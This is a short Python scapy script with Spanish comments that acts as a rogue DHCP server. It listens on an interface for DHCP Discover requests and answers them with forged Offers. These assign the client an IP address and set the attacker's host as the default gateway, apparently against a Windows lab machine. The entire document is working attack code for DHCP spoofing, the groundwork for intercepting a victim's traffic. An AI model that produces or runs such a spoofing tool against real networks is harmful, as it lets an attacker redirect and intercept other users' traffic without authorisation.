from scapy.all import *

# Tu interfaz de red
iface = "eth1"

def rogue_dhcp(pkt):
    # Si recibimos un DHCP Discover, respondemos con un Offer falso
    if DHCP in pkt and pkt[DHCP].options[0][1] == 1:
        print(f"Detectado DHCP Discover de: {pkt[Ether].src}")
        
        # Construimos el Offer falso
        # Le daremos la IP 10.24.20.100 al Windows
        off_pkt = Ether(src=get_if_hwaddr(iface), dst=pkt[Ether].src) / \
                  IP(src="10.24.20.1", dst="255.255.255.255") / \
                  UDP(sport=67, dport=68) / \
                  BOOTP(op=2, yiaddr="10.24.20.100", siaddr="10.24.20.1", chaddr=pkt[Ether].src, xid=pkt[BOOTP].xid) / \
                  DHCP(options=[("message-type", "offer"),
                                ("server_id", "10.24.20.1"),
                                ("subnet_mask", "255.255.255.0"),
                                ("router", "10.24.20.1"),
                                "end"])
        
        sendp(off_pkt, iface=iface, verbose=False)
        print("Enviado DHCP Offer falso (IP: 10.24.20.100)")

print("Esperando peticiones DHCP... (Corre 'ipconfig /renew' en Windows)")
sniff(filter="udp and (port 67 or 68)", iface=iface, prn=rogue_dhcp)
